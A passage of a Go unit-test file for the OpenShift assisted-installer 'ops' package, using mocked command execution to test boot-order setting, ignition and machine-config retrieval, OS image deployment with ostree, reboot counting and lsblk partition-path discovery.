package ops

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"

	"github.com/coreos/ignition/v2/config/v3_2/types"
	"github.com/go-openapi/swag"
	. "github.com/onsi/ginkgo"
	. "github.com/onsi/gomega"
	"github.com/onsi/gomega/ghttp"
	"github.com/openshift/assisted-installer/src/config"
	"github.com/openshift/assisted-installer/src/ops/execute"
	"github.com/openshift/assisted-installer/src/utils"
	mcfgv1 "github.com/openshift/machine-config-operator/pkg/apis/machineconfiguration.openshift.io/v1"
	"github.com/sirupsen/logrus"
	"github.com/thoas/go-funk"
	"github.com/vincent-petithory/dataurl"
	gomock "go.uber.org/mock/gomock"
)

var _ = Describe("installerArgs", func() {
	var (
		device       = "/dev/sda"
		ignitionPath = "/tmp/ignition.ign"
	)

	It("Returns the correct list with no extra args", func() {
		args := installerArgs(ignitionPath, device, nil)
		expected := []string{"install", "--insecure", "-i", "/tmp/ignition.ign", "/dev/sda"}
		Expect(args).To(Equal(expected))
	})

	It("Returns the correct list with empty extra args", func() {
		args := installerArgs(ignitionPath, device, []string{})
		expected := []string{"install", "--insecure", "-i", "/tmp/ignition.ign", "/dev/sda"}
		Expect(args).To(Equal(expected))
	})

	It("Returns the correct list with extra args", func() {
		args := installerArgs(ignitionPath, device, []string{"-n", "--append-karg", "nameserver=8.8.8.8"})
		expected := []string{"install", "--insecure", "-i", "/tmp/ignition.ign", "-n", "--append-karg", "nameserver=8.8.8.8", "/dev/sda"}
		Expect(args).To(Equal(expected))
	})
})

type MatcherContainsStringElements struct {
	Elements    []string
	ShouldMatch bool
}

func (o MatcherContainsStringElements) Matches(x interface{}) bool {
	switch reflect.TypeOf(x).Kind() {
	case reflect.Array, reflect.Slice:
		break
	default:
		return false
	}

	for _, e := range o.Elements {
		contains := funk.Contains(x, e)
		if !contains && o.ShouldMatch {
			return false
		} else if contains && !o.ShouldMatch {
			return false
		}
	}
	return true
}

func (o MatcherContainsStringElements) String() string {
	if o.ShouldMatch {
		return "All given elements should be in provided array"
	}
	return "All given elements should not be in provided array"
}

var _ = Describe("Upload logs", func() {
	var (
		l        = logrus.New()
		ctrl     *gomock.Controller
		execMock *execute.MockExecute
		conf     *config.Config
	)

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		execMock = execute.NewMockExecute(ctrl)
		conf = &config.Config{}
	})

	It("Upload logs with ca path", func() {
		conf = &config.Config{CACertPath: "test.ca"}
		m := MatcherContainsStringElements{[]string{"test.ca:test.ca", "-cacert=test.ca"}, true}
		o := NewOpsWithConfig(conf, l, execMock)
		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "podman", m, gomock.Any(), gomock.Any()).Times(1)
		_, err := o.UploadInstallationLogs(true)
		Expect(err).ToNot(HaveOccurred())
	})

	It("Upload logs without ca path", func() {
		m := MatcherContainsStringElements{[]string{"test.ca:test.ca", "-cacert=test.ca"}, false}
		o := NewOpsWithConfig(conf, l, execMock)
		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "podman", m, gomock.Any(), gomock.Any()).Times(1)
		_, err := o.UploadInstallationLogs(true)
		Expect(err).ToNot(HaveOccurred())
	})
})

var _ = Describe("Set Boot Order", func() {
	var (
		l        = logrus.New()
		ctrl     *gomock.Controller
		execMock *execute.MockExecute
		conf     *config.Config
	)

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		execMock = execute.NewMockExecute(ctrl)
		conf = &config.Config{}
	})

	for _, d := range []string{"redhat", "centos"} {
		efiDirname := d
		It(fmt.Sprintf("Set boot order for %s", efiDirname), func() {
			m1 := MatcherContainsStringElements{[]string{"/usr/sbin/bootlist"}, true}
			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "test", m1, gomock.Any()).Times(1).Return("", errors.New("Bootlist is not exist."))
			m2 := MatcherContainsStringElements{[]string{"-d", "/sys/firmware/efi"}, true}
			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "test", m2, gomock.Any()).Times(1)
			// Mock the lsblk call for getPartitionPathFromLsblk in findEfiDirectory
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "sda",
						"size": 100000000000,
						"type": "disk",
						"children": [
							{"name": "sda1", "size": 1048576, "type": "part"},
							{"name": "sda2", "size": 133169152, "type": "part"},
							{"name": "sda3", "size": 402653184, "type": "part"},
							{"name": "sda4", "size": 3272588800,"type": "part"}
						]
					}
				]
			}`
			mLsblk := MatcherContainsStringElements{[]string{"--bytes", "--json", "/dev/sda"}, true}
			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "lsblk", mLsblk, gomock.Any()).Times(1).Return(lsblkOutput, nil)
			m3 := MatcherContainsStringElements{[]string{"/dev/sda", "Red Hat Enterprise Linux"}, true}
			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "efibootmgr", m3, gomock.Any()).Times(1).Return("", nil)
			m4 := MatcherContainsStringElements{[]string{"-l"}, true}
			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "efibootmgr", m4, gomock.Any()).Times(1)
			m5 := MatcherContainsStringElements{[]string{"/dev/sda2", "/mnt"}, true}
			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "mount", m5, gomock.Any()).Times(1).Return("", nil)
			m6 := MatcherContainsStringElements{[]string{"-1", "/mnt/EFI"}, true}
			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "ls", m6, gomock.Any()).Times(1).Return(fmt.Sprintf("BOOT\n%s\n", efiDirname), nil)
			m7 := MatcherContainsStringElements{[]string{"/mnt"}, true}
			execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "umount", m7, gomock.Any()).Times(1).Return("", nil)
			o := NewOpsWithConfig(conf, l, execMock)
			err := o.SetBootOrder("/dev/sda")
			Expect(err).ToNot(HaveOccurred())
		})
	}

	It("Set boot order for ppc64le", func() {
		m1 := MatcherContainsStringElements{[]string{"/usr/sbin/bootlist"}, true}
		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "test", m1, gomock.Any()).Times(1)
		m2 := MatcherContainsStringElements{[]string{"/dev/sda"}, true}
		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "bootlist", m2, gomock.Any()).Times(1)
		o := NewOpsWithConfig(conf, l, execMock)
		err := o.SetBootOrder("/dev/sda")
		Expect(err).ToNot(HaveOccurred())
	})
})

var _ = Describe("Get encapsulated machine config", func() {
	var (
		l = logrus.New()
	)
	var localhostCert []byte

	// extract PEM-encoded certificate from a TLS ghttp server
	serverCertPEM := func(s *ghttp.Server) []byte {
		der := s.HTTPTestServer.TLS.Certificates[0].Certificate[0]
		return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	}

	BeforeEach(func() {
		s := ghttp.NewTLSServer()
		localhostCert = serverCertPEM(s)
		s.Close()
	})

	buildPointerIgnition := func(source string, withCert bool) types.Config {
		ret := types.Config{}
		ret.Ignition.Version = "3.2.0"
		ret.Ignition.Config.Merge = append(ret.Ignition.Config.Merge,
			types.Resource{
				Source: swag.String(source),
			})

		if !withCert {
			return ret
		}

		ret.Ignition.Security.TLS.CertificateAuthorities = append(ret.Ignition.Security.TLS.CertificateAuthorities,
			types.Resource{
				Source: swag.String(dataurl.EncodeBytes(localhostCert)),
			})

		return ret
	}

	buildPointerIgnitionFile := func(source string, withCert bool) string {
		cfg := buildPointerIgnition(source, withCert)
		b, err := json.Marshal(&cfg)
		Expect(err).ToNot(HaveOccurred())
		f, err := os.CreateTemp("", "ign")
		Expect(err).ToNot(HaveOccurred())
		_, err = f.Write(b)
		Expect(err).ToNot(HaveOccurred())
		f.Close()
		return f.Name()
	}
	Context("get pointed ignition", func() {
		checkSource := func(source string) {
			ignitionPath := buildPointerIgnitionFile(source, true)
			defer func() {
				_ = os.RemoveAll(ignitionPath)
			}()
			o := NewOps(l, nil).(*ops)
			ign, ca, err := o.getPointedIgnitionAndCA(ignitionPath)
			Expect(err).ToNot(HaveOccurred())
			Expect(ign).To(Equal(source))
			Expect(ca).To(Equal(string(localhostCert)))
		}
		It("from bootstrap", func() {
			checkSource("https://abc.com")
		})
		It("embedded", func() {
			checkSource(dataurl.EncodeBytes([]byte("source")))
		})
	})

	Context("get MCS ignition", func() {
		var (
			osImageURL      string
			kernelArguments []string
		)
		buildMcsIgnition := func(osImageURL string, kernelArguments []string) string {
			type file struct {
				Path     string
				Contents struct {
					Source string
				}
			}
			var ignition struct {
				Storage struct {
					Files []file
				}
			}
			var machineConfig mcfgv1.MachineConfig
			machineConfig.Spec.OSImageURL = osImageURL
			machineConfig.Spec.KernelArguments = kernelArguments
			b, err := json.Marshal(&machineConfig)
			Expect(err).ToNot(HaveOccurred())
			f := file{
				Path: encapsulatedMachineConfigFile,
			}
			f.Contents.Source = dataurl.EncodeBytes(b)
			ignition.Storage.Files = append(ignition.Storage.Files,
				file{Path: "/tmp/abc"},
				f,
				file{Path: "/zzz"})
			b, err = json.Marshal(&ignition)
			Expect(err).ToNot(HaveOccurred())
			return string(b)
		}
		checkMcsIgnition := func(source string, withCert bool, shouldSucceed bool) {
			ignitionPath := buildPointerIgnitionFile(source, withCert)
			defer func() {
				_ = os.RemoveAll(ignitionPath)
			}()
			o := NewOps(l, nil)
			mc, err := o.GetEncapsulatedMC(ignitionPath)
			if shouldSucceed {
				Expect(err).ToNot(HaveOccurred())
				Expect(mc).ToNot(BeNil())
				Expect(mc.Spec.OSImageURL).To(Equal(osImageURL))
				Expect(mc.Spec.KernelArguments).To(Equal(kernelArguments))
			} else {
				Expect(err).To(HaveOccurred())
			}
		}
		compress := func(data []byte) []byte {
			var buf bytes.Buffer
			w := gzip.NewWriter(&buf)
			_, err := w.Write(data)
			Expect(err).ToNot(HaveOccurred())
			w.Close()
			return buf.Bytes()
		}
		BeforeEach(func() {
			osImageURL = "https://os.machine.url"
			kernelArguments = []string{
				"arg1",
				"arg2",
			}
		})
		It("from bootstrap - non existant URL", func() {
			checkMcsIgnition("https://127.0.0.1:44", true, false)
		})
		It("from bootstrap - success", func() {
			s := ghttp.NewTLSServer()
			s.RouteToHandler("GET", "/",
				func(w http.ResponseWriter, req *http.Request) {
					_, err := io.WriteString(w, buildMcsIgnition(osImageURL, kernelArguments))
					Expect(err).ToNot(HaveOccurred())
				})
			checkMcsIgnition(s.URL(), true, true)
			s.Close()
		})
		It("from bootstrap - empty response", func() {
			s := ghttp.NewTLSServer()
			s.RouteToHandler("GET", "/",
				func(w http.ResponseWriter, req *http.Request) {
					_, err := io.WriteString(w, "")
					Expect(err).ToNot(HaveOccurred())
				})
			checkMcsIgnition(s.URL(), true, false)
			s.Close()
		})
		It("from bootstrap - with http no cert should succeed", func() {
			s := ghttp.NewServer()
			s.RouteToHandler("GET", "/",
				func(w http.ResponseWriter, req *http.Request) {
					_, err := io.WriteString(w, buildMcsIgnition(osImageURL, kernelArguments))
					Expect(err).ToNot(HaveOccurred())
				})
			checkMcsIgnition(s.URL(), false, true)
			s.Close()
		})
		It("from bootstrap - with http with cert should succeed", func() {
			s := ghttp.NewServer()
			s.RouteToHandler("GET", "/",
				func(w http.ResponseWriter, req *http.Request) {
					_, err := io.WriteString(w, buildMcsIgnition(osImageURL, kernelArguments))
					Expect(err).ToNot(HaveOccurred())
				})
			checkMcsIgnition(s.URL(), true, true)
			s.Close()
		})
		It("from bootstrap - with https with cert should succeed", func() {
			s := ghttp.NewTLSServer()
			s.RouteToHandler("GET", "/",
				func(w http.ResponseWriter, req *http.Request) {
					_, err := io.WriteString(w, buildMcsIgnition(osImageURL, kernelArguments))
					Expect(err).ToNot(HaveOccurred())
				})
			checkMcsIgnition(s.URL(), true, true)
			s.Close()
		})
		It("from bootstrap - with https no cert should fail", func() {
			s := ghttp.NewTLSServer()
			s.RouteToHandler("GET", "/",
				func(w http.ResponseWriter, req *http.Request) {
					_, err := io.WriteString(w, buildMcsIgnition(osImageURL, kernelArguments))
					Expect(err).ToNot(HaveOccurred())
				})
			checkMcsIgnition(s.URL(), false, false)
			s.Close()
		})
		It("embedded - success", func() {
			checkMcsIgnition(dataurl.EncodeBytes(compress([]byte(buildMcsIgnition(osImageURL, kernelArguments)))), true, true)
		})
	})
})

var _ = Describe("overwrite OS image", func() {
	const lsblkResultFormat = `{
   "blockdevices": [
		{
         "name": "%s",
         "size": 100000000000,
         "ro": false,
         "type": "disk",
         "mountpoints": [
             null
         ],
         "children": [
            {
               "name": "%s",
               "maj:min": "8:1",
               "rm": false,
               "size": 1048576,
               "ro": false,
               "type": "part",
               "mountpoints": [
                   null
               ]
            },{
               "name": "%s",
               "maj:min": "8:2",
               "rm": false,
               "size": 133169152,
               "ro": false,
               "type": "part",
               "mountpoints": [
                   null
               ]
            },{
               "name": "%s",
               "maj:min": "8:3",
               "rm": false,
               "size": 402653184,
               "ro": false,
               "type": "part",
               "mountpoints": [
                   null
               ]
            },{
               "name": "%s",
               "maj:min": "8:4",
               "rm": false,
               "size": 3272588800,
               "ro": false,
               "type": "part",
               "mountpoints": [
                   null
               ]
            }
         ]
      }
   ]
}`
	var (
		l        = logrus.New()
		ctrl     *gomock.Controller
		execMock *execute.MockExecute
		conf     *config.Config
		o        Ops
	)

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		execMock = execute.NewMockExecute(ctrl)
		conf = &config.Config{}
		o = NewOpsWithConfig(conf, l, execMock)
	})

	mockPrivileged := func(command string, args ...string) {
		execMock.EXPECT().ExecCommandWithOptions(nil, command, args, gomock.Any()).Times(1)
	}
	// Helper function to generate correct partition names for all device types
	getPartitionName := func(deviceName, partNum string) string {
		switch {
		case strings.HasPrefix(deviceName, "nvme"):
			return fmt.Sprintf("%sp%s", deviceName, partNum)
		case strings.HasPrefix(deviceName, "mmcblk"):
			return fmt.Sprintf("%sP%s", deviceName, partNum)
		case strings.HasPrefix(deviceName, "dm-"):
			// Device mapper devices use a different numbering scheme
			// For dm-0, partitions are dm-1, dm-2, dm-3, dm-4
			baseNum, err := strconv.Atoi(deviceName[3:]) // Extract number after "dm-"
			if err != nil {
				return deviceName + partNum // fallback
			}
			partNumInt, err := strconv.Atoi(partNum)
			if err != nil {
				return deviceName + partNum // fallback
			}
			return fmt.Sprintf("dm-%d", baseNum+partNumInt)
		default:
			return fmt.Sprintf("%s%s", deviceName, partNum)
		}
	}
	formatResult := func(device string) string {
		deviceName := stripDev(device)
		return fmt.Sprintf(lsblkResultFormat, deviceName,
			getPartitionName(deviceName, "1"),
			getPartitionName(deviceName, "2"),
			getPartitionName(deviceName, "3"),
			getPartitionName(deviceName, "4"))
	}
	runTest := func(device, part3, part4 string) {
		// Mock lsblk calls for partition path discovery (called twice - once for partition 4, once for partition 3)
		execMock.EXPECT().ExecCommandWithOptions(nil, "lsblk",
			[]string{"--bytes", "--json", device},
			gomock.Any()).Return(formatResult(device), nil).Times(2)
		// Mock lsblk call for calculateFreePercent function
		execMock.EXPECT().ExecCommandWithOptions(nil, "lsblk",
			[]string{"--bytes", "--json", device},
			gomock.Any()).Return(formatResult(device), nil)
		osImage := "quay.io/release-image:latest"
		extraArgs := []string{
			"--karg",
			"abc",
		}
		mockPrivileged("cat", "/proc/cmdline")
		mockPrivileged("uname", "-m")
		mockPrivileged("mount", part4, "/mnt")
		mockPrivileged("mount", part3, "/mnt/boot")
		mockPrivileged("growpart", "--free-percent=92", device, "4")
		mockPrivileged("xfs_growfs", "/mnt")
		mockPrivileged("setenforce", "0")
		mockPrivileged("ostree",
			"container",
			"image",
			"deploy",
			"--sysroot",
			"/mnt",
			"--authfile",
			"/root/.docker/config.json",
			"--imgref",
			"ostree-unverified-registry:quay.io/release-image:latest",
			"--karg",
			"ignition.platform.id=metal",
			"--karg",
			"$ignition_firstboot",
			"--stateroot",
			"rhcos",
			"--karg",
			"abc")
		mockPrivileged("fsfreeze", "--freeze", "/mnt/boot")
		mockPrivileged("umount", "/mnt/boot")
		mockPrivileged("fsfreeze", "--freeze", "/mnt")
		mockPrivileged("umount", "/mnt")
		err := o.OverwriteOsImage(osImage, device, extraArgs)
		Expect(err).ToNot(HaveOccurred())
	}
	It("overwrite OS image - sda", func() {
		runTest("/dev/sda", "/dev/sda3", "/dev/sda4")
	})
	It("overwrite OS image - nvme", func() {
		runTest("/dev/nvme0n1", "/dev/nvme0n1p3", "/dev/nvme0n1p4")
	})
	It("overwrite OS image - mmcblk", func() {
		runTest("/dev/mmcblk1", "/dev/mmcblk1P3", "/dev/mmcblk1P4")
	})
	It("overwrite OS image - device mapper", func() {
		runTest("/dev/dm-0", "/dev/dm-3", "/dev/dm-4")
	})
})

var _ = Describe("get number of reboots", func() {
	const (
		kubeconfigPath = "/kubeconfig"
		nodeName       = "node1"
	)
	var (
		l        = logrus.New()
		ctrl     *gomock.Controller
		execMock *execute.MockExecute
		conf     *config.Config
		o        Ops
	)

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		execMock = execute.NewMockExecute(ctrl)
		conf = &config.Config{}
		o = NewOpsWithConfig(conf, l, execMock)
	})
	expect := func(ret string, err error) {
		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(), "oc",
			[]string{
				"--kubeconfig",
				kubeconfigPath,
				"debug",
				fmt.Sprintf("node/%s", nodeName),
				"--",
				"chroot",
				"/host",
				"last",
				"reboot",
			},
			gomock.Any()).Return(ret, err)
	}
	It("1 reboot", func() {
		expect("reboot   system boot  4.18.0-372.9.1.e Tue Mar  7 04:13   still running\n", nil)
		numReboots, err := o.GetNumberOfReboots(context.TODO(), nodeName, kubeconfigPath)
		Expect(err).ToNot(HaveOccurred())
		Expect(numReboots).To(Equal(1))
	})
	It("2 reboot", func() {
		expect("reboot   system boot  4.18.0-372.9.1.e Tue Mar  7 04:13   still running\nreboot   system boot  4.18.0-372.9.1.e Sun Mar  5 07:29 - 09:11 (2+01:41)\n", nil)
		numReboots, err := o.GetNumberOfReboots(context.TODO(), nodeName, kubeconfigPath)
		Expect(err).ToNot(HaveOccurred())
		Expect(numReboots).To(Equal(2))
	})
	It("with error", func() {
		expect("", errors.New("An error"))
		_, err := o.GetNumberOfReboots(context.TODO(), nodeName, kubeconfigPath)
		Expect(err).To(HaveOccurred())
	})
})

var _ = Describe("WriteImageToExistingRoot", func() {
	const (
		osImage      = "quay.io/openshift-release-dev/ocp-v4.0-art-dev@sha256:d21f2ed754a66d18b0a13a59434fa4dc36abd4320e78f3be83a3e29e21e3c2f9"
		ignitionPath = "/tmp/ignition.ign"
	)
	var (
		l        = logrus.New()
		ctrl     *gomock.Controller
		execMock *execute.MockExecute
		o        *ops
	)

	expectExec := func(out string, err error, command string, args ...string) {
		execMock.EXPECT().ExecCommandWithOptions(gomock.Any(),
			command, args, gomock.Any()).Return(out, err)
	}

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		execMock = execute.NewMockExecute(ctrl)
		o = &ops{
			log:       l,
			logWriter: utils.NewLogWriter(l),
			installerConfig: &config.Config{
				CoreosImage: osImage,
			},
			executor: execMock,
		}
	})

	expectRemount := func() {
		expectExec("", nil, "mount", "/sysroot", "-o", "remount,rw")
		expectExec("", nil, "mount", "/boot", "-o", "remount,rw")
	}

	expectIgnitionSetup := func() {
		expectExec("", nil, "mkdir", "/boot/ignition")
		expectExec("", nil, "cp", ignitionPath, "/boot/ignition/config.ign")
		expectExec("", nil, "touch", "/boot/ignition.firstboot")
	}

	It("runs the correct commands when the node image ref doesn't exist", func() {
		expectRemount()
		expectExec("", fmt.Errorf("does not exist"), "stat", "/ostree/repo/refs/heads/coreos/node-image")
		expectExec("", nil, "ostree", "admin", "stateroot-init", "install")
		expectExec("", nil, "ostree", "container", "image", "deploy",
			"--stateroot", "install",
			"--sysroot", "/",
			"--authfile", "/root/.docker/config.json",
			"--karg", "$ignition_firstboot",
			"--karg", defaultIgnitionPlatformId,
			"--image", osImage)
		expectExec("", nil, "ostree", "admin", "finalize-staged")
		expectIgnitionSetup()

		Expect(o.WriteImageToExistingRoot(io.Discard, ignitionPath, nil)).To(Succeed())
	})

	It("deletes the node image ref when it exists", func() {
		expectRemount()
		expectExec("", nil, "stat", "/ostree/repo/refs/heads/coreos/node-image")
		expectExec("", nil, "ostree", "refs", "--repo", "/ostree/repo", "--delete", nodeImageOSTreeRefName)
		expectExec("", nil, "touch", "/ostree/repo/tmp/node-image")

		expectExec("", nil, "ostree", "admin", "stateroot-init", "install")
		expectExec("", nil, "ostree", "container", "image", "deploy",
			"--stateroot", "install",
			"--sysroot", "/",
			"--authfile", "/root/.docker/config.json",
			"--karg", "$ignition_firstboot",
			"--karg", defaultIgnitionPlatformId,
			"--image", osImage)
		expectExec("", nil, "ostree", "admin", "finalize-staged")
		expectIgnitionSetup()

		Expect(o.WriteImageToExistingRoot(io.Discard, ignitionPath, nil)).To(Succeed())
	})

	It("copies the network files when -n is provided", func() {
		expectRemount()
		expectExec("", fmt.Errorf("does not exist"), "stat", "/ostree/repo/refs/heads/coreos/node-image")
		expectExec("", nil, "ostree", "admin", "stateroot-init", "install")
		expectExec("", nil, "ostree", "container", "image", "deploy",
			"--stateroot", "install",
			"--sysroot", "/",
			"--authfile", "/root/.docker/config.json",
			"--karg", "$ignition_firstboot",
			"--karg", defaultIgnitionPlatformId,
			"--image", osImage)
		expectExec("", nil, "ostree", "admin", "finalize-staged")

		expectExec("", nil, "mkdir", "/boot/coreos-firstboot-network")
		expectExec("", nil, "rsync", "-av", "/etc/NetworkManager/system-connections/", "/boot/coreos-firstboot-network/")
		expectIgnitionSetup()

		installerArgs := []string{"-n"}
		Expect(o.WriteImageToExistingRoot(io.Discard, ignitionPath, installerArgs)).To(Succeed())
	})

	It("copies the network files when --copy-network is provided", func() {
		expectRemount()
		expectExec("", fmt.Errorf("does not exist"), "stat", "/ostree/repo/refs/heads/coreos/node-image")
		expectExec("", nil, "ostree", "admin", "stateroot-init", "install")
		expectExec("", nil, "ostree", "container", "image", "deploy",
			"--stateroot", "install",
			"--sysroot", "/",
			"--authfile", "/root/.docker/config.json",
			"--karg", "$ignition_firstboot",
			"--karg", defaultIgnitionPlatformId,
			"--image", osImage)
		expectExec("", nil, "ostree", "admin", "finalize-staged")

		expectExec("", nil, "mkdir", "/boot/coreos-firstboot-network")
		expectExec("", nil, "rsync", "-av", "/etc/NetworkManager/system-connections/", "/boot/coreos-firstboot-network/")
		expectIgnitionSetup()

		installerArgs := []string{"--copy-network"}
		Expect(o.WriteImageToExistingRoot(io.Discard, ignitionPath, installerArgs)).To(Succeed())
	})

	It("modifies kernel args when required", func() {
		expectRemount()
		expectExec("", fmt.Errorf("does not exist"), "stat", "/ostree/repo/refs/heads/coreos/node-image")
		expectExec("", nil, "ostree", "admin", "stateroot-init", "install")
		expectExec("", nil, "ostree", "container", "image", "deploy",
			"--stateroot", "install",
			"--sysroot", "/",
			"--authfile", "/root/.docker/config.json",
			"--karg", "$ignition_firstboot",
			"--karg", defaultIgnitionPlatformId,
			"--image", osImage)
		expectExec("", nil, "ostree", "admin", "finalize-staged")

		expectExec("", nil, "rpm-ostree", "kargs",
			"--os", "install",
			"--append", "nameserver=8.8.8.8",
			"--append", "foo=bar",
			"--delete-if-present", "baz",
		)
		expectExec("", nil, "ostree", "admin", "finalize-staged")
		expectIgnitionSetup()

		installerArgs := []string{"--append-karg", "nameserver=8.8.8.8", "--append-karg", "foo=bar", "--delete-karg", "baz"}
		Expect(o.WriteImageToExistingRoot(io.Discard, ignitionPath, installerArgs)).To(Succeed())
	})
})

var _ = Describe("getPartitionPathFromLsblk", func() {
	var (
		l        = logrus.New()
		ctrl     *gomock.Controller
		execMock *execute.MockExecute
		conf     *config.Config
		o        Ops
	)

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		execMock = execute.NewMockExecute(ctrl)
		conf = &config.Config{}
		o = NewOpsWithConfig(conf, l, execMock)
	})

	mockLsblkCommand := func(device, output string, err error) {
		execMock.EXPECT().ExecCommandWithOptions(nil, "lsblk",
			[]string{"--bytes", "--json", device}, gomock.Any()).Return(output, err)
	}

	Context("Standard SATA devices", func() {
		It("should find partition 3 for /dev/sda", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "sda",
						"size": 100000000000,
						"type": "disk",
						"children": [
							{"name": "sda1", "type": "part", "size": 1048576},
							{"name": "sda2", "type": "part", "size": 133169152},
							{"name": "sda3", "type": "part", "size": 402653184},
							{"name": "sda4", "type": "part", "size": 3272588800}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/sda", lsblkOutput, nil)

			path, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "3")
			Expect(err).ToNot(HaveOccurred())
			Expect(path).To(Equal("/dev/sda3"))
		})

		It("should find partition 4 for /dev/sda", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "sda",
						"size": 100000000000,
						"type": "disk",
						"children": [
							{"name": "sda1", "type": "part", "size": 1048576},
							{"name": "sda2", "type": "part", "size": 133169152},
							{"name": "sda3", "type": "part", "size": 402653184},
							{"name": "sda4", "type": "part", "size": 3272588800}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/sda", lsblkOutput, nil)

			path, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "4")
			Expect(err).ToNot(HaveOccurred())
			Expect(path).To(Equal("/dev/sda4"))
		})
	})

	Context("NVMe devices", func() {
		It("should find partition 3 for /dev/nvme0n1", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "nvme0n1",
						"size": 100000000000,
						"type": "disk",
						"children": [
							{"name": "nvme0n1p1", "type": "part", "size": 1048576},
							{"name": "nvme0n1p2", "type": "part", "size": 133169152},
							{"name": "nvme0n1p3", "type": "part", "size": 402653184},
							{"name": "nvme0n1p4", "type": "part", "size": 3272588800}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/nvme0n1", lsblkOutput, nil)

			path, err := o.(*ops).getPartitionPathFromLsblk("/dev/nvme0n1", "3")
			Expect(err).ToNot(HaveOccurred())
			Expect(path).To(Equal("/dev/nvme0n1p3"))
		})
	})

	Context("MMC devices", func() {
		It("should find partition 4 for /dev/mmcblk1", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "mmcblk1",
						"size": 100000000000,
						"type": "disk",
						"children": [
							{"name": "mmcblk1P1", "type": "part", "size": 1048576},
							{"name": "mmcblk1P2", "type": "part", "size": 133169152},
							{"name": "mmcblk1P3", "type": "part", "size": 402653184},
							{"name": "mmcblk1P4", "type": "part", "size": 3272588800}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/mmcblk1", lsblkOutput, nil)

			path, err := o.(*ops).getPartitionPathFromLsblk("/dev/mmcblk1", "4")
			Expect(err).ToNot(HaveOccurred())
			Expect(path).To(Equal("/dev/mmcblk1P4"))
		})
	})

	Context("Device Mapper devices", func() {
		It("should find partition 3 for /dev/dm-0", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "dm-0",
						"size": 100000000000,
						"type": "mpath",
						"children": [
							{"name": "dm-1", "type": "part", "size": 1048576},
							{"name": "dm-2", "type": "part", "size": 133169152},
							{"name": "dm-3", "type": "part", "size": 402653184},
							{"name": "dm-4", "type": "part", "size": 3272588800}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/dm-0", lsblkOutput, nil)

			path, err := o.(*ops).getPartitionPathFromLsblk("/dev/dm-0", "3")
			Expect(err).ToNot(HaveOccurred())
			Expect(path).To(Equal("/dev/mapper/dm-3"))
		})

		It("should find partition 4 for /dev/dm-0", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "dm-0",
						"size": 100000000000,
						"type": "mpath",
						"children": [
							{"name": "dm-1", "type": "part", "size": 1048576},
							{"name": "dm-2", "type": "part", "size": 133169152},
							{"name": "dm-3", "type": "part", "size": 402653184},
							{"name": "dm-4", "type": "part", "size": 3272588800}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/dm-0", lsblkOutput, nil)

			path, err := o.(*ops).getPartitionPathFromLsblk("/dev/dm-0", "4")
			Expect(err).ToNot(HaveOccurred())
			Expect(path).To(Equal("/dev/mapper/dm-4"))
		})

		It("should handle device mapper with higher numbers", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "dm-127",
						"size": 100000000000,
						"type": "mpath",
						"children": [
							{"name": "dm-128", "type": "part", "size": 1048576},
							{"name": "dm-129", "type": "part", "size": 133169152},
							{"name": "dm-130", "type": "part", "size": 402653184},
							{"name": "dm-131", "type": "part", "size": 3272588800}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/dm-127", lsblkOutput, nil)

			path, err := o.(*ops).getPartitionPathFromLsblk("/dev/dm-127", "3")
			Expect(err).ToNot(HaveOccurred())
			Expect(path).To(Equal("/dev/mapper/dm-130"))
		})
	})

	Context("Error cases", func() {
		It("should return error when lsblk command fails", func() {
			mockLsblkCommand("/dev/sda", "", errors.New("lsblk command failed"))

			_, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "3")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("failed to run lsblk command"))
		})

		It("should return error when lsblk output is invalid JSON", func() {
			mockLsblkCommand("/dev/sda", "invalid json", nil)

			_, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "3")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("failed to unmarshal lsblk output"))
		})

		It("should return error when device is not found", func() {
			lsblkOutput := `{"blockdevices": []}`
			mockLsblkCommand("/dev/sdb", lsblkOutput, nil)

			_, err := o.(*ops).getPartitionPathFromLsblk("/dev/sdb", "1")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("no block device information returned for /dev/sdb"))
